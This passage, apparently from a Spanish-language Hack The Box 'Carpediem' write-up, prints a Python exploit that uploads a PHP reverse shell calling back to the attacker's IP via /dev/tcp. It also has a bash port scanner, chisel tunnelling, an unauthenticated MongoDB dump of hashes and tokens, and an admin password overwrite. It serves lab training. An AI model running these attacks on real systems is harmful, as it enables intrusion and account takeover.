<span class="c1"># reverse shell
</span><span class="k">def</span> <span class="nf">reverse_shell</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
	<span class="c1"># listen to rev
</span>	<span class="k">print</span><span class="p">(</span><span class="s">'Open port {p} to receive the shell (g.e /usr/bin/nc -lvnp {p})'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">PORT</span><span class="p">))</span>
	<span class="nb">input</span><span class="p">(</span><span class="s">'Press any key to continue...'</span><span class="p">)</span>
	<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span> <span class="p">:</span> <span class="s">'multipart/form-data; boundary=123456789'</span><span class="p">}</span>
	<span class="n">post_data</span> <span class="o">=</span> <span class="s">"""--123456789</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name="file_upload"; filename="rev_shell.php"</span><span class="se">\r\n\n</span><span class="s">&lt;?php exec("/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1'"); ?&gt;</span><span class="se">\r\n</span><span class="s">--123456789"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

	<span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/classes/Users.php?f=upload'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
		
	<span class="n">file_name</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">'success'</span><span class="p">]).</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>

	<span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># make request
</span><span class="k">def</span> <span class="nf">request</span><span class="p">():</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="c1"># create session
</span>		<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
		<span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>

		<span class="c1"># register
</span>		<span class="n">user</span> <span class="o">=</span> <span class="n">register</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
		<span class="c1"># login
</span>		<span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">user</span><span class="p">)</span>
		
		<span class="c1"># change account_type value
</span>		<span class="n">user_id</span> <span class="o">=</span> <span class="mi">0</span>
		<span class="n">change_priv_thread</span> <span class="o">=</span> <span class="bp">False</span>
		<span class="k">while</span> <span class="ow">not</span> <span class="n">change_priv_thread</span><span class="p">:</span>
			<span class="n">change_priv_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">change_privileges</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">user_id</span><span class="p">))</span>
			<span class="n">change_priv_thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
			<span class="n">user_id</span> <span class="o">+=</span> <span class="mi">1</span>

		<span class="c1"># get reverse shell
</span>		<span class="n">reverse_shell</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>

	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">'[x] %s'</span> <span class="o">%</span> <span class="n">e</span><span class="p">);</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">request</span><span class="p">()</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Carpediem/rev_www-data.6/www-data_6.py">https://github.com/E1P0TR0</a></p></div></blockquote><p>Aplicando los pasos anteriores nos logramos conectar como el usuario <code class="language-plaintext highlighter-rouge">www-data</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">❯ python3 www-data_6.py 10.10.14.10 4444
Open port 4444 to receive the shell (g.e /usr/bin/nc -lvnp 4444)
Press any key to continue...

───────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.167.
Ncat: Connection from 10.10.11.167:55140.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">www-data@3c371615b7aa:/var/www/html/portal/uploads$</span><span class="w">
</span></pre></table></code></div></div><p>Al realizar una enumeración básica encontramos que no estamos en la máquina objetivo y nos encontramos en otra red:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">www-data@3c371615b7aa:/var/www/html/portal$</span><span class="w"> </span><span class="nb">hostname</span> <span class="nt">-I</span>
<span class="go">172.17.0.6 
</span><span class="gp">www-data@3c371615b7aa:/var/www/html/portal$</span><span class="w"> </span><span class="nb">cat</span> /etc/hosts
<span class="go">127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3      mysql a5004fe641ca
172.17.0.6      3c371615b7aa
</span></pre></table></code></div></div><p>Además, podemos asegurar que nos encontramos dentro de un contenedor <code class="language-plaintext highlighter-rouge">Docker</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="gp">www-data@3c371615b7aa:/var/www/html/portal$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> / | <span class="nb">grep </span>docker
<span class="go">-rwxr-xr-x   1 root root    0 Mar 24 15:34 .dockerenv     &lt;------------ file created by Docker
</span><span class="gp">www-data@3c371615b7aa:/var/www/html/portal$</span><span class="w"> </span><span class="nb">cat</span> /proc/1/cgroup  &lt;<span class="nt">------</span> List control <span class="nb">groups</span> <span class="o">(</span>all come from Docker<span class="o">)</span>
<span class="go">12:perf_event:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
11:cpuset:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
10:blkio:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
9:devices:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
8:rdma:/
7:net_cls,net_prio:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
6:memory:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
5:hugetlb:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
4:cpu,cpuacct:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
3:pids:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
2:freezer:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
1:name=systemd:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
0::/system.slice/containerd.service
</span></pre></table></code></div></div><p>En los archivos de la web y en las variables de entorno (env) encontramos unas credenciales de <strong>MySQL</strong> del usuario <code class="language-plaintext highlighter-rouge">portaldb</code> y <code class="language-plaintext highlighter-rouge">root</code>, respectivamente. Nos nos serán de ayuda pero es bueno saberlo</p><p>Con mas enumeración encontramos un nuevo <strong>subdominio</strong> en el archivo <em>Trudesk.php</em> (nombre que enteriormente vimos en la web “portal”). En resumen, <code class="language-plaintext highlighter-rouge">Trudek</code> es una solución de tickets de soporte técnico de código abierto. Agregamos la ruta nuestro archivo <em>/etc/hosts</em> y vemos la siguiente interfaz:</p><p><img data-src="/assets/img/htb/writeups/carpediem/trudesk_web.png" alt="trudesk" class="shadow" data-proofer-ignore></p><p>Como solo tenemos un panel de login, y no poseemos credenciales válidas, dejaremos esto para después</p><p>Ya que estamos en otra red, podemos escanear que <strong>hosts</strong> están disponibles y que <strong>puertos tienen abiertos</strong>. Para ello, usamos un script clásico en <code class="language-plaintext highlighter-rouge">bash</code> para reconocimiento:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># Host discovery</span>
<span class="c"># --------------</span>

<span class="c"># check if the host if live</span>
is_alive<span class="o">()</span>
<span class="o">{</span>
  <span class="c"># send ICMP packets and wait for response</span>
  ping <span class="nt">-c</span> 1 <span class="nv">$1</span> <span class="o">&gt;</span> /dev/null
  <span class="c"># check status code successful (= 0)</span>
  <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo </span>Host <span class="nv">$i</span>: UP.
<span class="o">}</span>

<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Host discovery:</span><span class="se">\n</span><span class="s2">"</span>
<span class="k">for </span>i <span class="k">in </span>172.17.0.<span class="o">{</span>1..255<span class="o">}</span> 
<span class="k">do</span>
  <span class="c"># run function and pass it to the background</span>
  is_alive <span class="nv">$i</span> &amp; <span class="nb">disown
</span><span class="k">done</span>

<span class="c"># --------------</span>


<span class="c"># Port discovery</span>
<span class="c"># --------------</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Port discovery:</span><span class="se">\n</span><span class="s2">"</span>

<span class="nb">declare</span> <span class="nt">-a</span> <span class="nv">hosts</span><span class="o">=(</span>172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.17.0.6<span class="o">)</span>

<span class="k">for </span>host <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">hosts</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span>
<span class="k">do
  </span><span class="nb">echo</span> <span class="s2">"Host </span><span class="nv">$host</span><span class="s2">:"</span>
  <span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 36000<span class="si">)</span>
  <span class="k">do
    </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/</span><span class="nv">$host</span><span class="s2">/</span><span class="nv">$port</span><span class="s2"> &amp;&amp; echo -e '</span><span class="se">\t</span><span class="s2">Port </span><span class="nv">$port</span><span class="s2">: OPEN'"</span> 2&gt;/dev/null &amp;
  <span class="k">done
done</span><span class="p">;</span> <span class="nb">wait</span>

<span class="c"># --------------</span>
</pre></table></code></div></div><blockquote><p>Lo ejecutamos, probablemente tome su tiempo, pero vale la pena</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="gp">www-data@3c371615b7aa:/tmp$</span><span class="w"> </span>./portDiscovery.sh 
<span class="go">
Host discovery:

Host 172.17.0.1: UP.
Host 172.17.0.4: UP.
Host 172.17.0.2: UP.
Host 172.17.0.6: UP.
Host 172.17.0.5: UP.
Host 172.17.0.3: UP.

Port discovery:

Host 172.17.0.1: &lt;--- Host machine (10.10.11.167)
        Port 80: OPEN
        Port 22: OPEN
Host 172.17.0.2:
        Port 27017: OPEN &lt;--- Mongodb
Host 172.17.0.3:
        Port 3306: OPEN &lt;--- MySQL (classic protocol)
        Port 33060: OPEN &lt;-- MySQL (X protocol)
Host 172.17.0.4:
        Port 21: OPEN &lt;--- FTP
        Port 80: OPEN &lt;--- Http
        Port 443: OPEN &lt;-- Https
Host 172.17.0.5:
        Port 8118: OPEN &lt;- Trudesk
Host 172.17.0.6: &lt;--- Were are here
        Port 80: OPEN
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Carpediem/reconnaissance/portDiscovery.sh">https://github.com/E1P0TR0</a></p></div></blockquote><p>Observamos varios puertos conocidos y los enlazamos con sus respectivos Servicios. Empezamos con el host <code class="language-plaintext highlighter-rouge">172.17.0.2</code> (<strong>MongoDB</strong>), el cuál es un sistema de base de datos noSQL</p><p>Ya que nos encontramos en un contenedor y nos tenemos muchas herramienta, lo que hacemos es simples palabras es <strong>enviar el tráfico del puerto de nuestra máquina objetivo a un puerto de nuestra máquina local</strong> (Remote port Forwarding). Para ello usamos la herramienta <code class="language-plaintext highlighter-rouge">chisel</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="gp">www-data@3c371615b7aa:/tmp$</span><span class="w"> </span>./chisel client 10.10.14.10:1234 R:27017:172.17.0.2:27017 
<span class="go">2022/09/06 03:16:42 client: Connecting to ws://10.10.14.10:1234
2022/09/06 03:16:43 client: Connected (Latency 107.222922ms)


──────────────────────────────────────────────────────────────────────────────────────────────
❯ ./chisel server -p 1234 --reverse
2022/09/05 22:15:59 server: Reverse tunnelling enabled
2022/09/05 22:15:59 server: Fingerprint nShNhlTjchKbgbrQZJUbJbiHDf9bMQpcNzs14TxFejY=
2022/09/05 22:15:59 server: Listening on http://0.0.0.0:1234
</span><span class="gp">2022/09/05 22:16:39 server: session#</span>1: tun: proxy#R:27017<span class="o">=&gt;</span>172.17.0.2:27017: Listening
<span class="go">

───────────────────────────────────────────────────────────────────────────────────────────────
❯ netstat -tlnp | grep 27017
tcp6       0      0 :::27017                :::*                    LISTEN      10520/./chisel 
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar la herramienta chisel en su repositorio <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p></div></blockquote><blockquote class="prompt-tip"><div><p>Aquí tienes más información sobre la creación de túneles con chisel y más <a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a></p></div></blockquote><p>Con el puerto en nuestra máquina local, ahora tenemos el servicio de <strong>MongoDB</strong> en nuestro puerto 27017 (puede ser cualquiera, pero por temas de orden y reconocimiento usamos el mismo). Para entrar a la base de datos usamos la herramienta <strong>mongo</strong> (shell interactiva en Javascript), y automáticamente de conectará como <strong>localhost</strong> al puerto <strong>27017</strong> (parámetros por defecto):</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="go">❯ mongo
MongoDB shell version v5.3.1
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("bb80bd61-3499-4d16-a3a4-39802bf17b68") }
MongoDB server version: 5.0.6
WARNING: shell and server versions do not match
================
Warning: the "mongo" shell has been superseded by "mongosh",
which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
an upcoming release.
For installation instructions, see
https://docs.mongodb.com/mongodb-shell/install/
================
---
The server generated these startup warnings when booting: &lt;---------- Here!
        2022-09-05T17:34:57.402+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
        2022-09-05T17:35:05.174+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
---
        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
        metrics about your deployment (disk utilization, CPU, operation statistics, etc).

        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
        and anyone you share the URL with. MongoDB may use this information to make product
        improvements and to suggest MongoDB products and deployment options to you.

        To enable free monitoring, run the following command: db.enableFreeMonitoring()
        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
---
</span></pre></table></code></div></div><blockquote class="prompt-warning"><div><p>Debido a la adevertencia, notamos que está herramienta será dada de baja, así que recomiendo usar <code class="language-plaintext highlighter-rouge">mongosh</code> más adelante</p></div></blockquote><p>Ni bien iniciamos <strong>mongo</strong>, notamos el siguiente mensaje generado por el servido al iniciar: <strong>“Access control is not enabled for the database. Read and write access to data and configuration is unrestricted”</strong>. Entonces nos dice que podemos leer y escribir en la base de datos?, eso es muy interesante.</p><p>Primero enumeramos un poco:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="gp">&gt;</span><span class="w"> </span>show dbs                                                                                                                                                           <span class="o">[</span>14/14]
<span class="go">admin    0.000GB 
config   0.000GB                                                                      
local    0.000GB
trudesk  0.001GB
</span><span class="gp">&gt;</span><span class="w"> </span>use admin                                                                           
<span class="go">switched to db admin                                                                  
</span><span class="gp">&gt;</span><span class="w"> </span>show collections                                                                    
<span class="go">system.users                                                                          
system.version                                                                        
</span><span class="gp">&gt;</span><span class="w"> </span>db.system.users.find<span class="o">()</span>                                                              
<span class="go">{ "_id" : "trudesk.trudesk", "userId" : UUID("91edf315-70ed-424b-8af5-df2be2559a88"), "user" : "trudesk", "db" : "trudesk", "credentials" : { "SCRAM-SHA-1" : { "iterationCo
unt" : 10000, "salt" : "Ko2s2ZtnyVXoPkj8V9swbQ==", "storedKey" : "RMcvISwRJ/G3Phy536k7qXNxrwY=", "serverKey" : "DVRoL2j5ZNdejyf6TxM7XiD+vzw=" }, "SCRAM-SHA-256" : { "iterat
ionCount" : 15000, "salt" : "R8aRmvuyjDHYUIpv28g/p5k3KVexBC4URSbE/g==", "storedKey" : "II/yV9Z2qyjX7TDXYI+Zqh3903ZeTtmiT082SH7k0CY=", "serverKey" : "8J62Bb5ugt2OJalKj1NMq6F
FsyFLhRpxXMRSmR9EeDM=" } }, "roles" : [ { "role" : "userAdmin", "db" : "trudesk" } ] } 
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Por el output <strong>0.00GB</strong> puedes pensar que no hay nada, pero es falso, existe información como el usuario <code class="language-plaintext highlighter-rouge">trudesk</code> que es administrador</p></div></blockquote><p>Vemos que está la base de datos <strong>Trudesk</strong> y podemos enlazarlo con la página que encontramos antes. En otras palabras, tenemos en nuestras manos la base de datos de el sistema Trudesk (el login page que vimos anteriormente). Encontramos muchas tablas, y una importante, la de cuentas:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">&gt;</span><span class="w"> </span>use trudesk
<span class="go">switched to db trudesk
</span><span class="gp">&gt;</span><span class="w"> </span>show collections
<span class="go">accounts
counters
departments
groups
messages
notifications
priorities
role_order
roles
sessions
settings
tags
teams
templates
tickets
tickettypes
</span><span class="gp">&gt;</span><span class="w"> </span>db.accounts.find<span class="o">()</span>
<span class="gp">{ "_id" : ObjectId("623c8b20855cc5001a8ba13c"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "admin", "password" : "$</span>2b<span class="nv">$10$imwoLPu0Au8LjNr08GXGy</span>.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS<span class="s2">", "</span>fullname<span class="s2">" : "</span>Robert Frost<span class="s2">", "</span>email<span class="s2">" : "</span>rfrost@carpediem.htb<span class="s2">", "</span>role<span class="s2">" : ObjectId("</span>623c8b20855cc5001a8ba138<span class="s2">"), "</span>title<span class="s2">" : "</span>Sr. Network Engineer<span class="s2">", "</span>accessToken<span class="s2">" : "</span>22e56ec0b94db029b07365d520213ef6f5d3d2d9<span class="s2">", "</span>__v<span class="s2">" : 0, "</span>lastOnline<span class="s2">" : ISODate("</span>2022-04-07T20:30:32.198Z<span class="s2">") }
</span><span class="gp">{ "_id" : ObjectId("6243c0be1e0d4d001b0740d4"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jhammond", "email" : "jhammond@carpediem.htb", "password" : "$</span><span class="s2">2b</span><span class="nv">$10$n4yEOTLGA0SuQ</span><span class="s2">.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq"</span>, <span class="s2">"fullname"</span> : <span class="s2">"Jeremy Hammond"</span>, <span class="s2">"title"</span> : <span class="s2">"Sr. Systems Engineer"</span>, <span class="s2">"role"</span> : ObjectId<span class="o">(</span><span class="s2">"623c8b20855cc5001a8ba139"</span><span class="o">)</span>, <span class="s2">"accessToken"</span> : <span class="s2">"a0833d9a06187dfd00d553bd235dfe83e957fd98"</span>, <span class="s2">"__v"</span> : 0, <span class="s2">"lastOnline"</span> : ISODate<span class="o">(</span><span class="s2">"2022-04-01T23:36:55.940Z"</span><span class="o">)</span> <span class="o">}</span>
<span class="gp">{ "_id" : ObjectId("6243c28f1e0d4d001b0740d6"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jpardella", "email" : "jpardella@carpediem.htb", "password" : "$</span>2b<span class="nv">$10$nNoQGPes116eTUUl</span>/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK<span class="s2">", "</span>fullname<span class="s2">" : "</span>Joey Pardella<span class="s2">", "</span>title<span class="s2">" : "</span>Desktop Support<span class="s2">", "</span>role<span class="s2">" : ObjectId("</span>623c8b20855cc5001a8ba139<span class="s2">"), "</span>accessToken<span class="s2">" : "</span>7c0335559073138d82b64ed7b6c3efae427ece85<span class="s2">", "</span>__v<span class="s2">" : 0, "</span>lastOnline<span class="s2">" : ISODate("</span>2022-04-07T20:33:20.918Z<span class="s2">") }
</span><span class="gp">{ "_id" : ObjectId("6243c3471e0d4d001b0740d7"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "acooke", "email" : "acooke@carpediem.htb", "password" : "$</span><span class="s2">2b</span><span class="nv">$10$qZ64GjhVYetulM</span><span class="s2">.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s."</span>, <span class="s2">"fullname"</span> : <span class="s2">"Adeanna Cooke"</span>, <span class="s2">"title"</span> : <span class="s2">"Director - Human Resources"</span>, <span class="s2">"role"</span> : ObjectId<span class="o">(</span><span class="s2">"623c8b20855cc5001a8ba139"</span><span class="o">)</span>, <span class="s2">"accessToken"</span> : <span class="s2">"9c7ace307a78322f1c09d62aae3815528c3b7547"</span>, <span class="s2">"__v"</span> : 0, <span class="s2">"lastOnline"</span> : ISODate<span class="o">(</span><span class="s2">"2022-03-30T14:21:15.212Z"</span><span class="o">)</span> <span class="o">}</span>
<span class="gp">{ "_id" : ObjectId("6243c69d1acd1559cdb4019b"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "svc-portal-tickets", "email" : "tickets@carpediem.htb", "password" : "$</span>2b<span class="nv">$10$CSRmXjH</span>/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW<span class="s2">", "</span>fullname<span class="s2">" : "</span>Portal Tickets<span class="s2">", "</span>title<span class="s2">" : "", "</span>role<span class="s2">" : ObjectId("</span>623c8b20855cc5001a8ba13a<span class="s2">"), "</span>accessToken<span class="s2">" : "</span>f8691bd2d8d613ec89337b5cd5a98554f8fffcc4<span class="s2">", "</span>__v<span class="s2">" : 0, "</span>lastOnline<span class="s2">" : ISODate("</span>2022-03-30T13:50:02.824Z<span class="s2">") }
</span></pre></table></code></div></div><p>Como primer usuario vemos el nombre de <code class="language-plaintext highlighter-rouge">admin</code>, eso ya es sospechoso, así que intentamos actualizar su contraseña:</p><blockquote><p>Análisis de contraseña</p></blockquote><p><img data-src="/assets/img/htb/writeups/carpediem/bcrypt_hash.png" alt="bcryptPass" data-proofer-ignore></p><blockquote><p>Necesitamos generar una contraseña de formato <code class="language-plaintext highlighter-rouge">bcrypt</code>, para ello usamos <code class="language-plaintext highlighter-rouge">python</code>:</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">bcrypt</span>

<span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'bestpassword123'</span>

<span class="n">salt</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="p">.</span><span class="n">gensalt</span><span class="p">()</span>
<span class="n">password_hash</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="p">.</span><span class="n">hashpw</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">password_hash</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>

<span class="c1"># Output
# $2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs.
</span></pre></table></code></div></div><blockquote><p>Volvemos a la base de datos y actualizamos la contraseña</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">&gt;</span><span class="w"> </span>db.accounts.update<span class="o">({</span><span class="s2">"username"</span>:<span class="s2">"admin"</span><span class="o">}</span>, <span class="o">{</span><span class="nv">$set</span>: <span class="o">{</span><span class="s2">"password"</span> : <span class="s2">"</span><span class="nv">$2b$12$J0bmFJhw6gJ3HmSfSLmnb</span><span class="s2">.WbdIMkrhEPzMte.kY9f59GhreFX2vs."</span><span class="o">}})</span>
